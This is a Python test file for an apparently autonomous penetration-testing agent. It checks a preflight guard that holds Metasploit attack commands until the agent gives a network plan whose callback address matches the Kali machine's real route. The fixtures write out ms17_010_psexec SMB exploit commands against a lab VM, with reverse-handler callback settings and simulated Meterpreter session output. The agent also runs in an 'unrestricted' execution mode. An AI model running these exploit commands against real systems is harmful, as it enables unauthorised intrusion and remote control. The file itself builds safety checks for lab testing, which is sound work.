"""Transcript replay checks for the XXS agent's first exploit round."""

import contextlib
import io
import json
import os
import unittest
from unittest.mock import patch

import deep_agent
from network_preflight import (
    bind_settings, callback_settings, is_attack_attempt, is_bind_failure,
    parse_preflight, preflight_command, should_preflight, target_from_command,
    targets_from_command, validate_plan,
)
from test_kali_chat import KaliChatTests


TARGET = "192.168.56.102"
KALI_IP = "10.0.2.15"


def transcript_preflight_record():
    return {
        "command": preflight_command(TARGET),
        "execution_state": "completed",
        "exit_code": 0,
        "stdout": json.dumps([{
            "ifname": "eth0",
            "addr_info": [{"family": "inet", "local": KALI_IP, "prefixlen": 24}],
        }]) + "\n" + json.dumps([{
            "dst": TARGET, "gateway": "10.0.2.2", "dev": "eth0", "prefsrc": KALI_IP,
        }]),
        "stderr": "",
        "timed_out": False,
        "duration_seconds": 0.05,
    }


def msf_attempt(callback_address):
    command = (
        "msfconsole --quiet -q <<'EOF'\n"
        "use exploit/windows/smb/ms17_010_psexec\n"
        f"set RHOSTS {TARGET}\n"
        f"set LHOST {callback_address}\n"
        "exploit -j\nEOF"
    )
    plan = {
        "target": TARGET,
        "local_address": KALI_IP,
        "listener_bind_address": KALI_IP,
        "callback_address": callback_address,
        "callback_reachability": "unverified",
    }
    return deep_agent._make_tool_call(
        "run_kali_command", {"command": command, "network_plan": plan},
    )


class NetworkPreflightTests(unittest.TestCase):
    def test_preflight_is_scoped_to_remote_attack_tasks(self):
        self.assertTrue(should_preflight(f"attack the lab VM {TARGET}", TARGET))
        self.assertFalse(should_preflight("check Kali's interface", TARGET))
        self.assertEqual(preflight_command(TARGET),
                         f"ip -j -4 address show && ip -j -4 route get {TARGET}")

    def test_transcript_route_exposes_actual_kali_source_and_gateway(self):
        assessment = parse_preflight(transcript_preflight_record(), TARGET)
        self.assertTrue(assessment["observed"])
        self.assertEqual(assessment["source_address"], KALI_IP)
        self.assertEqual(assessment["route"]["gateway"], "10.0.2.2")
        self.assertEqual(assessment["addresses"][0]["interface"], "eth0")

    def test_mismatched_lhost_is_held_and_correct_local_lhost_passes(self):
        assessment = parse_preflight(transcript_preflight_record(), TARGET)
        wrong = json.loads(msf_attempt("192.168.56.101")["function"]["arguments"])
        right = json.loads(msf_attempt(KALI_IP)["function"]["arguments"])
        self.assertIn(
            "also its default listener bind address",
            validate_plan(wrong["network_plan"], assessment, wrong["command"], lambda _: None),
        )
        self.assertIsNone(
            validate_plan(right["network_plan"], assessment, right["command"], lambda _: None),
        )
        changed_command = right["command"].replace(
            f"set LHOST {KALI_IP}", "set LHOST 192.168.56.101",
        )
        self.assertIn(
            "does not match every LHOST address",
            validate_plan(right["network_plan"], assessment, changed_command, lambda _: None),
        )

    def test_verified_callback_needs_controller_evidence_of_a_target_session(self):
        assessment = parse_preflight(transcript_preflight_record(), TARGET)
        call = msf_attempt(KALI_IP)
        args = json.loads(call["function"]["arguments"])
        args["network_plan"]["callback_reachability"] = "verified"
        self.assertIn(
            "recorded command-evidence ID",
            validate_plan(args["network_plan"], assessment, args["command"], lambda _: None),
        )

    def test_both_metasploit_and_handwritten_smb_attempts_need_network_plan(self):
        self.assertTrue(is_attack_attempt("msfconsole -q -r /tmp/run.rc"))
        self.assertTrue(is_attack_attempt(
            "python3 -c 'import socket,struct; socket.socket(); struct.pack(\"<H\",1); SMB2'"
        ))
        self.assertFalse(is_attack_attempt("nmap -sC -sV 192.168.56.102"))
        self.assertTrue(is_bind_failure("Handler failed to bind to 192.168.56.101:4444"))
        self.assertFalse(is_bind_failure("Exploit completed, but no session was created."))

    def test_command_target_uses_rhosts_before_lhost(self):
        self.assertEqual(
            target_from_command("set LHOST 192.168.56.101\nset RHOSTS 192.168.56.102"),
            TARGET,
        )

    def test_inline_metasploit_settings_are_parsed_and_target_is_checked(self):
        command = (
            'msfconsole -x "use exploit/windows/smb/ms17_010_psexec; '
            f'set RHOSTS {TARGET}; set LHOST {KALI_IP}; '
            f'set ReverseListenerBindAddress {KALI_IP}; exploit"'
        )
        self.assertEqual(targets_from_command(command), [TARGET])
        self.assertEqual(target_from_command(command), TARGET)
        self.assertEqual(callback_settings(command), [KALI_IP])
        self.assertEqual(bind_settings(command), [KALI_IP])

        assessment = parse_preflight(transcript_preflight_record(), TARGET)
        plan = msf_attempt(KALI_IP)["function"]["arguments"]
        plan = json.loads(plan)["network_plan"]
        self.assertIsNone(validate_plan(plan, assessment, command, lambda _: None))
        wrong_target_command = command.replace(TARGET, "192.168.56.103")
        self.assertIn(
            "command targets 192.168.56.103",
            validate_plan(plan, assessment, wrong_target_command, lambda _: None),
        )

    def test_malformed_or_inconsistent_route_data_is_not_observed(self):
        for route_json in ('[null]', '[{"dst":"192.168.56.103","prefsrc":"10.0.2.15"}]'):
            with self.subTest(route_json=route_json):
                record = transcript_preflight_record()
                interface_json, _ = record["stdout"].split("\n", 1)
                record["stdout"] = interface_json + "\n" + route_json
                assessment = parse_preflight(record, TARGET)
                self.assertFalse(assessment["observed"])
                self.assertTrue(assessment["error"])

        record = transcript_preflight_record()
        interface_json, route_json = record["stdout"].split("\n", 1)
        interface = json.loads(interface_json)
        interface[0]["addr_info"] = [{"family": "inet", "local": "10.0.0.8", "prefixlen": 24}]
        record["stdout"] = json.dumps(interface) + "\n" + route_json
        self.assertFalse(parse_preflight(record, TARGET)["observed"])

    def test_verified_callback_requires_successful_matching_session_evidence(self):
        assessment = parse_preflight(transcript_preflight_record(), TARGET)
        call = msf_attempt(KALI_IP)
        args = json.loads(call["function"]["arguments"])
        plan = args["network_plan"]
        plan["callback_reachability"] = "verified"
        plan["callback_evidence_id"] = "evidence-1"

        class Evidence:
            def __init__(self, **fields):
                self.fields = fields

            def to_dict(self, include_streams=True):
                return self.fields

        valid = Evidence(
            execution_state="completed", exit_code=0, timed_out=False,
            output_truncated=False,
            stdout=("Meterpreter session 1 opened "
                    f"({KALI_IP}:4444 -> {TARGET}:49152) at 2026-10-03"),
            stderr="",
        )
        self.assertIsNone(
            validate_plan(plan, assessment, args["command"], lambda _: valid),
        )

        invalid_records = [
            Evidence(**{**valid.fields, "stdout": valid.fields["stdout"].replace(TARGET, "192.168.56.103")}),
            Evidence(**{**valid.fields, "stdout": valid.fields["stdout"].replace(KALI_IP, "192.168.56.101")}),
            Evidence(**{**valid.fields, "execution_state": "failed"}),
            Evidence(**{**valid.fields, "timed_out": True}),
            Evidence(**{**valid.fields, "output_truncated": True}),
        ]
        for evidence in invalid_records:
            with self.subTest(evidence=evidence.fields):
                self.assertIn(
                    "successful, complete session",
                    validate_plan(plan, assessment, args["command"], lambda _: evidence),
                )

    def test_transcript_replay_holds_bad_first_lhost_then_runs_corrected_plan(self):
        with patch.dict(os.environ, {
            "DEEP_AGENT_EXECUTION_MODE": "unrestricted",
            "DEEP_AGENT_MODEL": "agent-27b",
        }), patch.object(deep_agent, "MODEL", "agent-27b"):
            kali, model_calls, output = KaliChatTests()._run_chat(
                [f"attack the lab Windows VM {TARGET}"],
                [
                    {"content": "", "tool_calls": [msf_attempt("192.168.56.101")]},
                    {"content": "", "tool_calls": [msf_attempt(KALI_IP)]},
                    {"content": "No session was created.", "tool_calls": []},
                ],
                run_records=[
                    transcript_preflight_record(),
                    {"stdout": "[*] Started reverse TCP handler on 10.0.2.15:4444\n",
                     "exit_code": 0},
                ],
            )

        self.assertEqual(kali.run.call_count, 2)
        self.assertEqual(kali.run.call_args_list[0].args[0], preflight_command(TARGET))
        self.assertIn("set LHOST 10.0.2.15", kali.run.call_args_list[1].args[0])
        self.assertEqual(len(model_calls), 3)
        second_request = model_calls[1][2]
        self.assertTrue(any(
            '"source_address":"10.0.2.15"' in
            message.get("content", "")
            for message in second_request
        ))
        self.assertIn("Network plan needed", output)

    def test_clean_network_plan_reaches_a_tool_result_in_two_model_rounds(self):
        with patch.dict(os.environ, {
            "DEEP_AGENT_EXECUTION_MODE": "unrestricted",
            "DEEP_AGENT_MODEL": "agent-27b",
        }), patch.object(deep_agent, "MODEL", "agent-27b"):
            kali, model_calls, _ = KaliChatTests()._run_chat(
                [f"attack the lab Windows VM {TARGET}"],
                [
                    {"content": "", "tool_calls": [msf_attempt(KALI_IP)]},
                    {"content": "The scan completed; no session was created.", "tool_calls": []},
                ],
                run_records=[
                    transcript_preflight_record(),
                    {"stdout": "[*] Started reverse TCP handler on 10.0.2.15:4444\n",
                     "exit_code": 0},
                ],
            )
        self.assertEqual(len(model_calls), 2)
        self.assertEqual(kali.run.call_count, 2)

    def test_directly_typed_exploit_waits_for_a_model_network_plan(self):
        direct_command = (
            "msfconsole --quiet -q <<'EOF'\n"
            "use exploit/windows/smb/ms17_010_psexec\n"
            f"set RHOSTS {TARGET}\n"
            f"set LHOST {KALI_IP}\n"
            "exploit\nEOF"
        )
        with patch.dict(os.environ, {
            "DEEP_AGENT_EXECUTION_MODE": "unrestricted",
            "DEEP_AGENT_MODEL": "agent-27b",
        }), patch.object(deep_agent, "MODEL", "agent-27b"):
            kali, model_calls, output = KaliChatTests()._run_chat(
                ["/kali " + direct_command],
                [
                    {"content": "", "tool_calls": [msf_attempt(KALI_IP)]},
                    {"content": "The attempt ran; no session was created.", "tool_calls": []},
                ],
                run_records=[
                    transcript_preflight_record(),
                    {"stdout": "[*] Started reverse TCP handler on 10.0.2.15:4444\n",
                     "exit_code": 0},
                ],
            )
        self.assertEqual(kali.run.call_count, 2)
        self.assertEqual(kali.run.call_args_list[0].args[0], preflight_command(TARGET))
        self.assertIn("set LHOST 10.0.2.15", kali.run.call_args_list[1].args[0])
        self.assertEqual(len(model_calls), 2)
        self.assertIn("direct exploit command has not run", output)

    def test_bind_failure_refreshes_route_before_the_next_attempt(self):
        with patch.dict(os.environ, {
            "DEEP_AGENT_EXECUTION_MODE": "unrestricted",
            "DEEP_AGENT_MODEL": "agent-27b",
        }), patch.object(deep_agent, "MODEL", "agent-27b"):
            kali, model_calls, _ = KaliChatTests()._run_chat(
                [f"attack the lab Windows VM {TARGET}"],
                [
                    {"content": "", "tool_calls": [msf_attempt(KALI_IP)]},
                    {"content": "", "tool_calls": [msf_attempt(KALI_IP)]},
                    {"content": "The target did not open a session.", "tool_calls": []},
                ],
                run_records=[
                    transcript_preflight_record(),
                    {"stdout": "[-] Handler failed to bind to 10.0.2.15:4444\n",
                     "exit_code": 0},
                    transcript_preflight_record(),
                    {"stdout": "[*] Exploit completed, but no session was created.\n",
                     "exit_code": 0},
                ],
            )
        commands = [call.args[0] for call in kali.run.call_args_list]
        self.assertEqual(len(commands), 4)
        self.assertEqual(commands[2], preflight_command(TARGET))
        self.assertEqual(len(model_calls), 3)


if __name__ == "__main__":
    unittest.main()
